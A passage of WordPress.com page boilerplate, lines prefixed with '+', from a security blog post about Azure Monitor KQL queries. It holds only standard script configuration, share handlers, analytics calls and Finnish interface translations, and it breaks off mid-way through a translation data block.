+	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
+	SyntaxHighlighter.config.strings.help = '?';
+	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
+	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
+	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
+	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
+	SyntaxHighlighter.defaults['toolbar'] = false;
+	SyntaxHighlighter.all();
+
+	// Infinite scroll support
+	document.addEventListener( 'is.post-load', function () {
+		SyntaxHighlighter.highlight();
+	} );
+</script>
+<link crossorigin="anonymous" rel="stylesheet" id="all-css-0-2" href="https://s0.wp.com/_static/??-eJyljUEKwkAMRS/kGAap1IV4FGlngqZmkqGZtNcvgt25EFz+x+c9WGtIKg2lQfFQ2R8kBhO2OqTXZ0NRFbiTJBidOEN7YsHQVNlgRqsqRguGhTLqF3JMZgf4vVQ0O6NBGmZ1QwZbqeIcRpfM+LdtP+3gLbyVazz3XTzF/tJNG0hBaT4=&amp;cssminify=yes" type="text/css" media="all">
+<script type="text/javascript" id="comment-like-js-extra">
+/* <![CDATA[ */
+var comment_like_text = {"loading":"Lataa...","swipeUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/comment-likes\/js\/lib\/swipe.js?ver=20131008"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="coblocks-loader-js-extra">
+/* <![CDATA[ */
+var wpcom_coblocks_js = {"coblocks_masonry_js":"https:\/\/s0.wp.com\/wp-content\/plugins\/coblocks\/2.18.1-simple-rev.4\/dist\/js\/coblocks-masonry.min.js","coblocks_lightbox_js":"https:\/\/s0.wp.com\/wp-content\/plugins\/coblocks\/2.18.1-simple-rev.4\/dist\/js\/coblocks-lightbox.min.js","jquery_core_js":"\/wp-includes\/js\/jquery\/jquery.min.js","jquery_migrate_js":"\/wp-includes\/js\/jquery\/jquery-migrate.min.js","masonry_js":"\/wp-includes\/js\/masonry.min.js","imagesloaded_js":"\/wp-includes\/js\/imagesloaded.min.js"};
+var coblocksLigthboxData = {"closeLabel":"Close Gallery","leftLabel":"Edellinen","rightLabel":"Seuraava"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="nikau-script-js-extra">
+/* <![CDATA[ */
+var screenReaderText = {"expand":"<span class=\"screen-reader-text\">n\u00e4yt\u00e4 alavalikko<\/span>","collapse":"<span class=\"screen-reader-text\">piilota alavalikko<\/span>"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="verbum-settings-js-before">
+/* <![CDATA[ */
+window.VerbumComments = {"Log in or provide your name and email to leave a reply.":"Log in or provide your name and email to leave a reply.","Log in or provide your name and email to leave a comment.":"Log in or provide your name and email to leave a comment.","Receive web and mobile notifications for posts on this site.":"Receive web and mobile notifications for posts on this site.","Name":"Nimi","Email (address never made public)":"Email (address never made public)","Website (optional)":"Kotisivu (valinnainen)","Leave a reply. (log in optional)":"Leave a reply. (log in optional)","Leave a comment. (log in optional)":"Leave a comment. (log in optional)","Log in to leave a reply.":"Log in to leave a reply.","Log in to leave a comment.":"Log in to leave a comment.","Logged in via %s":"Logged in via %s","Log out":"Kirjaudu ulos","Email":"S\u00e4hk\u00f6postiosoite","(Address never made public)":"(Osoitetta ei koskaan julkaista)","Instantly":"Instantly","Daily":"Daily","Reply":"Vastaus","Comment":"kommentti","WordPress":"WordPress","Weekly":"Viikoittain","Notify me of new posts":"Notify me of new posts","Email me new posts":"Email me new posts","Email me new comments":"Email me new comments","Cancel":"Peruuta","Write a comment...":"Kirjoita kommentti...","Write a reply...":"Write a reply...","Website":"Kotisivu","Optional":"Valinnaiset","We'll keep you in the loop!":"We'll keep you in the loop!","Loading your comment...":"Loading your comment...","Discover more from":"Discover more from SecureCloudBlog","Subscribe now to keep reading and get access to the full archive.":"Subscribe now to keep reading and get access to the full archive.","Continue reading":"Lue lis\u00e4\u00e4","Never miss a beat!":"Never miss a beat!","Interested in getting blog post updates? Simply click the button below to stay in the loop!":"Interested in getting blog post updates? Simply click the button below to stay in the loop!","Enter your email address":"Sy\u00f6t\u00e4 s\u00e4hk\u00f6postiosoitteesi","Subscribe":"Tilaa","Comment sent successfully":"Comment sent successfully","Save my name, email, and website in this browser for the next time I comment.":"Tallenna nimeni, s\u00e4hk\u00f6postiosoitteeni ja kotisivuni t\u00e4h\u00e4n selaimeen seuraavaa kommentointikertaa varten.","siteId":146690742,"postId":6481,"mustLogIn":false,"requireNameEmail":true,"commentRegistration":false,"connectURL":"https:\/\/securecloud188323504.wordpress.com\/public.api\/connect\/?action=request&domain=securecloud.blog","logoutURL":"https:\/\/securecloud188323504.wordpress.com\/wp-login.php?action=logout&_wpnonce=25108bbade","homeURL":"https:\/\/securecloud.blog\/","subscribeToBlog":true,"subscribeToComment":true,"isJetpackCommentsLoggedIn":false,"jetpackUsername":"","jetpackUserId":0,"jetpackSignature":"","jetpackAvatar":"https:\/\/0.gravatar.com\/avatar\/?s=96&amp;d=identicon&amp;r=G","enableBlocks":true,"enableSubscriptionModal":true,"currentLocale":"fi","isJetpackComments":false,"allowedBlocks":["core\/paragraph","core\/list","core\/code","core\/list-item","core\/quote","core\/image","core\/embed","core\/quote","core\/code"],"embedNonce":"f0af450b80","verbumBundleUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/jetpack-mu-wpcom-plugin\/moon\/vendor\/automattic\/jetpack-mu-wpcom\/src\/features\/verbum-comments\/dist\/index.js","isRTL":false,"vbeCacheBuster":1717067639}
+/* ]]> */
+</script>
+<script crossorigin="anonymous" type="text/javascript" src="https://s0.wp.com/_static/??-eJx9kNtOwzAMhl+I1CuqVG4Qz5IlHnNrOyGHTX37BdoKGBNXluzvP8hwjcYFLagFpJrI9Z00A9OMGT4qVjxb9Yypm/ITPIYnLNG62bTVNbog2wEkBIULqg8JbC1BbCnk/uCQk4NjJfYNTscqLUOkZWSwOWMbflEr5AwH6/9tsgnNWn+6W9wLv1VHDm7O8Nz1L11vMklkNAkv3QCeclmdVmgvIaS7H6nj6n8HJoy8/IT20HJGaWhMKFQFlGZbP4Wnqq5Q0PzI9avE9sl2ioGXEzFv/m/y2o/9OByGwzhMN8rgrX4="></script>
+<script type="text/javascript" crossorigin="anonymous" src="https://s0.wp.com/wp-content/plugins/gutenberg-core/v18.4.1/build/hooks/index.min.js?m=1716578158i&amp;ver=3aee234ea7807d8d70bc" id="wp-hooks-js"></script>
+<script type="text/javascript" crossorigin="anonymous" src="https://s0.wp.com/wp-content/plugins/gutenberg-core/v18.4.1/build/i18n/index.min.js?m=1716578158i&amp;ver=5baa98e4345eccc97e24" id="wp-i18n-js"></script>
+<script type="text/javascript" id="wp-i18n-js-after">
+/* <![CDATA[ */
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+/* ]]> */
+</script>
+<script type="text/javascript" id="jetpack-carousel-js-extra">
+/* <![CDATA[ */
+var jetpackSwiperLibraryPath = {"url":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/jetpack-plugin\/moon\/_inc\/build\/carousel\/swiper-bundle.min.js"};
+var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"fi","ajaxurl":"https:\/\/securecloud.blog\/wp-admin\/admin-ajax.php","nonce":"3d72eed082","display_exif":"1","display_comments":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"kommentti","post_comment":"L\u00e4het\u00e4 kommentti","write_comment":"Kirjoita kommentti...","loading_comments":"Ladataan kommentteja...","download_original":"Katso t\u00e4ysikokoisena <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Varmista, ett\u00e4 liit\u00e4t jotain teksti\u00e4 kommenttiisi, ole hyv\u00e4.","no_comment_email":"Anna s\u00e4hk\u00f6postiosoitteesi kommenttiin, ole hyv\u00e4.","no_comment_author":"Anna nimesi kommenttiin, ole hyv\u00e4.","comment_post_error":"Pahoittelemme koska kommentin l\u00e4hett\u00e4misess\u00e4 tapahtui virhe. Yrit\u00e4 my\u00f6hemmin uudelleen, ole hyv\u00e4.","comment_approved":"Kommenttisi hyv\u00e4ksyttiin.","comment_unapproved":"Kommentti on arvioitavana.","camera":"Kamera","aperture":"Aukko","shutter_speed":"Sulkimen nopeus","focal_length":"Polttov\u00e4li","copyright":"Kaikki oikeudet pid\u00e4tet\u00e4\u00e4n","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/securecloud188323504.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Fsecurecloud.blog%2F2022%2F04%2F27%2Fazure-monitor-malicious-kql-query%2F","blog_id":"146690742","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"],"stats_query_args":"blog=146690742&v=wpcom&tz=0&user_id=0&subd=securecloud188323504","is_public":"1"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="sharing-js-js-extra">
+/* <![CDATA[ */
+var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
+/* ]]> */
+</script>
+<script crossorigin="anonymous" type="text/javascript" src="https://s0.wp.com/_static/??-eJydj8EKwjAQRH/IdCtFrAfxUyQma5s22Q3dpMW/F2rrQUSht53H7AwDU1SGKSElCFlFnxtHAh2mqE2/aAjMBFdHBm7ZeQupxYAqMXuBASUyiRtRjc4ifyFFcFR0soNNZUYPnAX927eCP7G6dxIwqaooX3EruA+z2f74XSvUFA2HD7l9irR6QKutfcyno2bZcAnn/bGsD9VpX9XdEz6ml+k="></script>
+<script type="text/javascript" id="sharing-js-js-after">
+/* <![CDATA[ */
+var windowOpen;
+			( function () {
+				function matches( el, sel ) {
+					return !! (
+						el.matches && el.matches( sel ) ||
+						el.msMatchesSelector && el.msMatchesSelector( sel )
+					);
+				}
+
+				document.body.addEventListener( 'click', function ( event ) {
+					if ( ! event.target ) {
+						return;
+					}
+
+					var el;
+					if ( matches( event.target, 'a.share-twitter' ) ) {
+						el = event.target;
+					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
+						el = event.target.parentNode;
+					}
+
+					if ( el ) {
+						event.preventDefault();
+
+						// If there's another sharing window open, close it.
+						if ( typeof windowOpen !== 'undefined' ) {
+							windowOpen.close();
+						}
+						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
+						return false;
+					}
+				} );
+			} )();
+var windowOpen;
+			( function () {
+				function matches( el, sel ) {
+					return !! (
+						el.matches && el.matches( sel ) ||
+						el.msMatchesSelector && el.msMatchesSelector( sel )
+					);
+				}
+
+				document.body.addEventListener( 'click', function ( event ) {
+					if ( ! event.target ) {
+						return;
+					}
+
+					var el;
+					if ( matches( event.target, 'a.share-linkedin' ) ) {
+						el = event.target;
+					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
+						el = event.target.parentNode;
+					}
+
+					if ( el ) {
+						event.preventDefault();
+
+						// If there's another sharing window open, close it.
+						if ( typeof windowOpen !== 'undefined' ) {
+							windowOpen.close();
+						}
+						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
+						return false;
+					}
+				} );
+			} )();
+/* ]]> */
+</script>
+
+	<script type="text/javascript">
+		(function () {
+			var wpcom_reblog = {
+				source: 'toolbar',
+
+				toggle_reblog_box_flair: function (obj_id, post_id) {
+
+					// Go to site selector. This will redirect to their blog if they only have one.
+					const postEndpoint = `https://wordpress.com/post`;
+
+					// Ideally we would use the permalink here, but fortunately this will be replaced with the 
+					// post permalink in the editor.
+					const originalURL = `${ document.location.href }?page_id=${ post_id }`; 
+					
+					const url =
+						postEndpoint +
+						'?url=' +
+						encodeURIComponent( originalURL ) +
+						'&is_post_share=true' +
+						'&v=5';
+
+					const redirect = function () {
+						if (
+							! window.open( url, '_blank' )
+						) {
+							location.href = url;
+						}
+					};
+
+					if ( /Firefox/.test( navigator.userAgent ) ) {
+						setTimeout( redirect, 0 );
+					} else {
+						redirect();
+					}
+				},
+			};
+
+			window.wpcom_reblog = wpcom_reblog;
+		})();
+	</script>
+<script type="text/javascript">
+// <![CDATA[
+(function() {
+try{
+  if ( window.external &&'msIsSiteMode' in window.external) {
+    if (window.external.msIsSiteMode()) {
+      var jl = document.createElement('script');
+      jl.type='text/javascript';
+      jl.async=true;
+      jl.src='/wp-content/plugins/ie-sitemode/custom-jumplist.php';
+      var s = document.getElementsByTagName('script')[0];
+      s.parentNode.insertBefore(jl, s);
+    }
+  }
+}catch(e){}
+})();
+// ]]>
+</script>	<iframe src="https://widgets.wp.com/likes/master.html?ver=20240615#ver=20240615&amp;lang=fi&amp;lang_ver=1713530677&amp;origin=https://securecloud.blog" scrolling="no" id="likes-master" name="likes-master" style="display:none;"></iframe>
+	<div id="likes-other-gravatars" class="wpl-new-layout" role="dialog" aria-hidden="true" tabindex="-1">
+		<div class="likes-text">
+			<span>%d</span>		</div>
+		<ul class="wpl-avatars sd-like-gravatars"></ul>
+	</div>
+
+		<script src="//stats.wp.com/w.js?67" defer=""></script> <script type="text/javascript">
+_tkq = window._tkq || [];
+_stq = window._stq || [];
+_tkq.push(['storeContext', {'blog_id':'146690742','blog_tz':'0','user_lang':'fi','blog_lang':'fi','user_id':'0'}]);
+_stq.push(['view', {'blog':'146690742','v':'wpcom','tz':'0','user_id':'0','post':'6481','subd':'securecloud188323504'}]);
+		_stq.push(['extra', {'crypt':'UE40eW5QN0p8M2Y/RE1mNzc2NTVTamdsd0xoLz9RQkM2K298TXY9bERQMXc2MjhEaVZfb2wwakRoSj0mUkp1THptM1NdbkV1WjZIcU9mVWQmPUIvMlN6Jk8wW3NYVEJ3dWZOWExuWD9qbk49UHBrclV5STNkUltZYzEwdXg0SV15bmMmOS1sTUFtYmkwfEVac0dkRGVIRFk9VU5qSmNpcDNiU1VLMnx3THE/Y3oub2YuZ2hJLEVYN2I0MVprWVs1aFJHJVR0aUJ5MUxKUixHbUp0fkJNRjVYc198cHk9OGtzWDdFYlI2T3lOfnUrWSVKRzNPdldILXhKSG1fM0lLWVtRfmRkQ1pWK0NGZi1PP3dkNUpkUmdiZkkuOW5seDMuaDQlWA=='}]);
+_stq.push([ 'clickTrackerInit', '146690742', '6481' ]);
+</script>
+<noscript><img src="https://pixel.wp.com/b.gif?v=noscript" style="height:1px;width:1px;overflow:hidden;position:absolute;bottom:1px;" alt="" /></noscript>
+<script defer="" id="bilmur" data-customproperties="{&quot;enq_jquery&quot;:&quot;1&quot;,&quot;logged_in&quot;:&quot;0&quot;,&quot;wptheme&quot;:&quot;premium\/nikau&quot;,&quot;wptheme_is_block&quot;:&quot;0&quot;}" data-provider="wordpress.com" data-service="simple" src="/wp-content/js/bilmur.min.js?i=12&amp;m=202424"></script><script>
+if ( 'object' === typeof wpcom_mobile_user_agent_info ) {
+
+	wpcom_mobile_user_agent_info.init();
+	var mobileStatsQueryString = "";
+	
+	if( false !== wpcom_mobile_user_agent_info.matchedPlatformName )
+		mobileStatsQueryString += "&x_" + 'mobile_platforms' + '=' + wpcom_mobile_user_agent_info.matchedPlatformName;
+	
+	if( false !== wpcom_mobile_user_agent_info.matchedUserAgentName )
+		mobileStatsQueryString += "&x_" + 'mobile_devices' + '=' + wpcom_mobile_user_agent_info.matchedUserAgentName;
+	
+	if( wpcom_mobile_user_agent_info.isIPad() )
+		mobileStatsQueryString += "&x_" + 'ipad_views' + '=' + 'views';
+
+	if( "" != mobileStatsQueryString ) {
+		new Image().src = document.location.protocol + '//pixel.wp.com/g.gif?v=wpcom-no-pv' + mobileStatsQueryString + '&baba=' + Math.random();
+	}
+	
+}
+</script>
+<script type="disabled" id="wp-enqueue-dynamic-script:verbum:translations:1">
+( function( domain, translations ) {
+	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
+	localeData[""].domain = domain;
+	wp.i18n.setLocaleData( localeData, domain );
+} )( "default", {"translation-revision-date":"2020-11-20 07:45:18+0000","generator":"GlotPress/4.0.1","domain":"messages","locale_data":{"messages":{"100":[],"":{"domain":"messages","plural-forms":"nplurals=2; plural=n != 1;","lang":"fi"},"Disable":[],"Enable":[],"Font library\u0004Library":[],"Justify text":[],"This block allows overrides. Changing the name can cause problems with content entered into instances of this pattern.":[],"Add background image":[],"Rows":[],"Overrides":[],"Search commands and settings":[],"Remove citation":[],"Collapse all other items.":[],"Non breaking space":[],"This block is locked.":[],"verb\u0004Grid":[],"Grid placement":[],"Presets":[],"Lowercase letter A\u0004a":[],"Uppercase letter A\u0004A":[],"Connected to dynamic data":[],"Connected to %s":[],"block toolbar button label\u0004Connected":[],"Shuffle":[],"Drop shadows":[],"font category\u0004Display":[],"Select parent block (%s)":[],"heading levels\u0004All":[],"font categories\u0004All":[],"Text that indicates that the pattern is synchronized\u0004Synced":[],"Text that indicates that the pattern is not synchronized\u0004Not synced":[],"authors\u0004All":[],"categories\u0004All":[],"Alternative text for an image. Block toolbar label, a low character count is preferred.\u0004Alt":[],"Upload to Media Library":[],"Focal point":[],"Be careful!":[],"%s.":[],"%s styles.":[],"%s settings.":[],"%s element.":[],"%s block.":[],", ":[],"Disable expand on click":[],"Scales the image with a lightbox effect":[],"Scale the image with a lightbox effect.":[],"Link to attachment page":[],"Link to image file":[],"screen sizes\u0004All":[],"Locked":[],"No transforms.":[],"patterns\u0004Not synced":[],"patterns\u0004Synced":[],"Manage the inclusion of blocks added automatically by plugins.":[],"Grid span":[],"Row span":[],"Column span":[],"Drop shadow":[],"Repeat":[],"Contain":[],"Copy link%s":[],"Link copied to clipboard.":[],"Manual":[],"Deselect":[],"Select all":[],"header landmark area\u0004Header":[],"Left and right sides":[],"Top and bottom sides":[],"Right side":[],"Left side":[],"Bottom side":[],"Top side":[],"Unfiltered":[],"action label\u0004Duplicate":[],"Is":[],"Inserter":[],"Interface":[],"Caption text":[],"Option that makes an individual pattern synchronized\u0004Synced":[],"Restore":[],"Option that shows all patterns that are not synchronized\u0004Not synced":[],"Option that shows all synchronized patterns\u0004Synced":[],"block title\u0004Form":[],"block keyword\u0004button":[],"block keyword\u0004submit":[],"block keyword\u0004message":[],"block keyword\u0004notification":[],"block keyword\u0004input":[],"Hide":[],"Large viewport largest dimension (lvmax)":[],"Small viewport largest dimension (svmax)":[],"Dynamic viewport largest dimension (dvmax)":[],"Dynamic viewport smallest dimension (dvmin)":[],"Dynamic viewport width or height (dvb)":[],"Dynamic viewport width or height (dvi)":[],"Dynamic viewport height (dvh)":[],"Dynamic viewport width (dvw)":[],"Large viewport smallest dimension (lvmin)":[],"Large viewport width or height (lvb)":[],"Large viewport width or height (lvi)":[],"Large viewport height (lvh)":[],"Large viewport width (lvw)":[],"Small viewport smallest dimension (svmin)":[],"Small viewport width or height (svb)":[],"Viewport smallest size in the block direction (svb)":[],"Small viewport width or height (svi)":[],"Viewport smallest size in the inline direction (svi)":[],"Small viewport height (svh)":[],"Small viewport width (svw)":[],"No color selected":[],"Value":[],"Required":[],"Method":[],"Email":[],"Fields":[],"No results":[],"Multiple blocks selected":[],"Block name changed to: \"%s\".":[],"Block name reset to: \"%s\".":[],"https://wordpress.org/patterns/":[],"Patterns are available from the <Link>WordPress.org Pattern Directory</Link>, bundled in the active theme, or created by users on this site. Only patterns created on this site can be synced.":[],"Source":[],"Theme & Plugins":[],"Pattern Directory":[],"Mark as nofollow":[],"Fonts":[],"font style\u0004Normal":[],"font weight\u0004Normal":[],"Notice":[],"Error notice":[],"Information notice":[],"Warning notice":[],"Block: Paragraph":[],"Expand on click":[],"Image settings\u0004Settings":[],"Enter a custom name for this block.":[],"Drop to upload":[],"Reset ":[],"Background image":[],"Only images can be used as a background image.":[],"No image selected":[],"Selected image: %s":[],"No results found":[],"%d category button displayed.":[],"Ungroup":[],"a second":[],"block title\u0004Date":[],"block title\u0004Content":[],"block title\u0004Author":[],"block keyword\u0004toggle":[],"No":[],"Post overview\u0004Outline":[],"Select text across multiple blocks.":[],"block keyword\u0004reusable":[],"Last page":[],"paging\u0004%1$s of %2$s":[],"Previous page":[],"First page":[],"%s item":[],"Continue":[],"Name for applying graphical effects\u0004Filters":[],"Reusable blocks are now synced patterns. A synced pattern will behave in exactly the same way as a reusable block.":[],"My patterns":[],"block keyword\u0004references":[],"My pattern":[],"Initial %d result loaded. Type to filter all available results. Use up and down arrow keys to navigate.":[],"Lowercase Roman numerals":[],"Uppercase Roman numerals":[],"Lowercase letters":[],"Uppercase letters":[],"Numbers":[],"Numbering style":[],"Image is contained without distortion.":[],"Image covers the space evenly.":[],"Image size option for resolution control\u0004Full Size":[],"Image size option for resolution control\u0004Large":[],"Image size option for resolution control\u0004Medium":[],"Image size option for resolution control\u0004Thumbnail":[],"Scale":[],"Scale down the content to fit the space if it is too big. Content that is too small will have additional padding.":[],"Scale option for dimensions control\u0004Scale down":[],"Do not adjust the sizing of the content. Content that is too large will be clipped, and content that is too small will have additional padding.":[],"Scale option for dimensions control\u0004None":[],"Fill the space by clipping what doesn't fit.":[],"Scale option for dimensions control\u0004Cover":[],"Fit the content to the space without clipping.":[],"Scale option for dimensions control\u0004Contain":[],"Fill the space by stretching the content.":[],"Scale option for dimensions control\u0004Fill":[],"Aspect ratio option for dimensions control\u0004Custom":[],"Aspect ratio option for dimensions control\u0004Tall - 9:16":[],"Aspect ratio option for dimensions control\u0004Wide - 16:9":[],"Aspect ratio option for dimensions control\u0004Classic Portrait - 2:3":[],"Aspect ratio option for dimensions control\u0004Classic - 3:2":[],"Aspect ratio option for dimensions control\u0004Portrait - 3:4":[],"Aspect ratio option for dimensions control\u0004Standard - 4:3":[],"Aspect ratio option for dimensions control\u0004Square - 1:1":[],"Aspect ratio option for dimensions control\u0004Original":[],"Additional link settings\u0004Advanced":[],"Position: %1$s":[],"The block will stick to the scrollable area of the parent %s block.":[],"block title\u0004Title":[],"Unknown":[],"Parent":[],"Pending":[],"Focal point top position":[],"Focal point left position":[],"Suggestions":[],"Button label to reveal side configuration options\u0004%s options":[],"Horizontal & vertical":[],"Right to left":[],"Left to right":[],"Text direction":[],"A valid language attribute, like \"en\" or \"fr\".":[],"Language":[],"%d pattern found":[],"Activate":[],"Color %s styles":[],"Add after":[],"Add before":[],"block keyword\u0004disclosure":[],"https://wordpress.org/documentation/article/embeds/":[],"https://wordpress.org/documentation/article/page-jumps/":[],"Leave empty if decorative.":[],"Alternative text":[],"Resolution":[],"Name for the value of the CSS position property\u0004Fixed":[],"Name for the value of the CSS position property\u0004Sticky":[],"Minimum column width":[],"Example:":[],"Image inserted.":[],"Image uploaded and inserted.":[],"Insert":[],"External images can be removed by the external provider without warning and could even have legal compliance issues related to privacy legislation.":[],"This image cannot be uploaded to your Media Library, but it can still be inserted as an external image.":[],"Insert external image":[],"Scrollable section":[],"Aspect ratio":[],"Dismiss hint":[],"Openverse":[],"There is an error with your CSS structure.":[],"Shadow":[],"Border & Shadow":[],"Center":[],"Align text":[],"Append to %1$s block at position %2$d, Level %3$d":[],"%s block inserted":[],"Report %s":[],"Copy styles":[],"Stretch items":[],"Block vertical alignment setting\u0004Space between":[],"Block vertical alignment setting\u0004Stretch to fill":[],"Currently selected position: %s":[],"Position":[],"The block will not move when the page is scrolled.":[],"The block will stick to the top of the window instead of scrolling.":[],"Sticky":[],"Paste styles":[],"Pasted styles to %d blocks.":[],"Pasted styles to %s.":[],"Unable to paste styles. Block styles couldn't be found within the copied content.":[],"Unable to paste styles. Please allow browser clipboard permissions before continuing.":[],"Unable to paste styles. This feature is only available on secure (https) sites in supporting browsers.":[],"Tilde":[],"Clear Unknown Formatting":[],"CSS":[],"Additional CSS":[],"Specify a fixed height.":[],"Block pattern category\u0004Audio":[],"block keyword\u0004page":[],"Media List":[],"Go to parent Navigation block":[],"Fixed":[],"Fit":[],"Fit contents.":[],"Specify a fixed width.":[],"Stretch to fill available space.":[],"Extra Extra Large":[],": %s":[],"Words:":[],"Decrement":[],"Increment":[],"Remove caption":[],"Caption":[],"Pattern":[],"Not available for aligned text.":[],"Arrow option for Next/Previous link\u0004Arrow":[],"Arrow option for Next/Previous link\u0004None":[],"Format tools":[],"handle":[],"Modify":[],"Nested blocks will fill the width of this container. Toggle to constrain.":[],"You are currently in zoom-out mode.":[],"XXL":[],"The Queen of Hearts.":[],"The Mad Hatter.":[],"The Cheshire Cat.":[],"The White Rabbit.":[],"Alice.":[],"Inner blocks use content width":[],"Font":[],"Constrained":[],"Spacing control":[],"Custom (%s)":[],"All sides":[],"H6":[],"H5":[],"H4":[],"H3":[],"H2":[],"H1":[],"Move %1$d blocks from position %2$d left by one place":[],"Move %1$d blocks from position %2$d down by one place":[],"Wide size":[],"Content size":[],"Set the width of the main content area.":[],"Border color and style picker":[],"Blocks cannot be moved right as they are already are at the rightmost position":[],"Blocks cannot be moved left as they are already are at the leftmost position":[],"All blocks are selected, and cannot be moved":[],"Hover":[],"Apply to all blocks inside":[],"Unset":[],"Embed a podcast player from Pocket Casts.":[],"Nested blocks use content width with options for full and wide widths.":[],"Parents":[],"block title\u0004Comments":[],"All options reset":[],"All options are currently hidden":[],"%s is now visible":[],"%s hidden and reset to default":[],"%s reset to default":[],"Suffix":[],"Prefix":[],"Add pattern":[],"Response":[],"Search for blocks":[],"Bottom border":[],"Right border":[],"Left border":[],"Top border":[],"Close border color":[],"Border color picker.":[],"Border color and style picker.":[],"Link sides":[],"Unlink sides":[],"Quote citation":[],"Stack":[],"Use featured image":[],"Delete selection.":[],"Transform to %s":[],"verb\u0004Stack":[],"single horizontal line\u0004Row":[],"Select parent block: %s":[],"Restrict editing":[],"Alignment option\u0004None":[],"Vertical alignment":[],"Align items bottom":[],"Align items center":[],"Align items top":[],"block title\u0004No results":[],"block description\u0004Create a list item.":[],"block title\u0004List item":[],"Custom color picker. The currently selected color is called \"%1$s\" and has a value of \"%2$s\".":[],"Invalid":[],"Lock":[],"Unlock":[],"Prevent removal":[],"Disable movement":[],"Lock all":[],"Choose specific attributes to restrict or lock all available options.":[],"Lock %s":[],"%s blocks deselected.":[],"%s deselected.":[],"Select the size of the source image.":[],"font weight\u0004Black":[],"font weight\u0004Extra Bold":[],"font weight\u0004Bold":[],"font weight\u0004Semi Bold":[],"font weight\u0004Medium":[],"font weight\u0004Regular":[],"font weight\u0004Light":[],"font weight\u0004Extra Light":[],"font weight\u0004Thin":[],"font style\u0004Italic":[],"font style\u0004Regular":[],"Transparent text may be hard for people to read.":[],"preview":[],"Link is empty":[],"Button label to reveal tool panel options\u0004%s options":[],"Set custom size":[],"Use size preset":[],"Color options":[],"Done":[],"Color %s":[],"Color format":[],"Hex color":[],"Icon":[],"Delete":[],"block title\u0004Pagination":[],"Actions":[],"Rename":[],"Aa":[],"Arrow option for Comments Pagination Next/Previous blocks\u0004Arrow":[],"Arrow option for Comments Pagination Next/Previous blocks\u0004None":[],"Indicates this palette is created by the user.\u0004Custom":[],"Indicates this palette comes from the theme.\u0004Custom":[],"Indicates this palette comes from WordPress.\u0004Default":[],"Indicates this palette comes from the theme.\u0004Theme":[],"Add default block":[],"styles":[],"block title\u0004Pattern":[],"%s applied.":[],"%s removed.":[],"Menus":[],"Embed Wolfram notebook content.":[],"Displays more block tools":[],"Create a two-tone color effect without losing your original image.":[],"Explore all patterns":[],"Orientation":[],"Allow to wrap to multiple lines":[],"block style label\u0004Plain":[],"Elements":[],"Submenus":[],"Display":[],"Embed Pinterest pins, boards, and profiles.":[],"bookmark":[],"Highlight":[],"Create page: <mark>%s</mark>":[],"Palette":[],"Block spacing":[],"Max %s wide":[],"label before the title of the previous post\u0004Previous:":[],"label before the title of the next post\u0004Next:":[],"block title\u0004Submenu":[],"Colors":[],"Show %s":[],"Hide and reset %s":[],"Reset %s":[],"Minimum height":[],"Size of a UI element\u0004Extra Large":[],"Size of a UI element\u0004Large":[],"Size of a UI element\u0004Medium":[],"Size of a UI element\u0004Small":[],"Size of a UI element\u0004None":[],"No selection":[],"Arrow option for Query Pagination Next/Previous blocks\u0004Arrow":[],"Arrow option for Query Pagination Next/Previous blocks\u0004None":[],"Arrow":[],"Preload value\u0004None":[],"Row":[],"noun; Audio block parameter\u0004Preload":[],"Media item link option\u0004None":[],"Currently selected font appearance: %s":[],"Currently selected font style: %s":[],"Currently selected font weight: %s":[],"No selected font appearance":[],"Justification":[],"Reset all":[],"Currently selected font size: %s":[],"Currently selected: %s":[],"Image scaling options\u0004Scale":[],"Scale option for Image dimension control\u0004Fill":[],"Scale option for Image dimension control\u0004Contain":[],"Scale option for Image dimension control\u0004Cover":[],"If uploading to a gallery all files need to be image formats":[],"Flow":[],"Flex":[],"Style":[],"Radius":[],"Link radii":[],"Unlink radii":[],"Bottom right":[],"Bottom left":[],"Top right":[],"Top left":[],"block keyword\u0004link":[],"No preview available.":[],"noun\u0004Document":[],"block keyword\u0004movie":[],"block keyword\u0004summary":[],"block keyword\u0004description":[],"block keyword\u0004divider":[],"block keyword\u0004hr":[],"block keyword\u0004find":[],"block keyword\u0004atom":[],"block keyword\u0004cite":[],"block keyword\u0004blockquote":[],"block keyword\u0004text":[],"block description\u0004Start with the basic building block of all narrative.":[],"block keyword\u0004pagination":[],"block keyword\u0004navigation":[],"block keyword\u0004menu":[],"block keyword\u0004video":[],"block keyword\u0004image":[],"block keyword\u0004form":[],"block keyword\u0004numbered list":[],"block keyword\u0004ordered list":[],"block keyword\u0004bullet list":[],"block description\u0004Create a bulleted or numbered list.":[],"block style label\u0004Rounded":[],"block style label\u0004Default":[],"block keyword\u0004picture":[],"block keyword\u0004photo":[],"block keyword\u0004img":[],"block description\u0004Insert an image to make a visual statement.":[],"block keyword\u0004embed":[],"block keyword\u0004title":[],"block keyword\u0004section":[],"block keyword\u0004row":[],"block 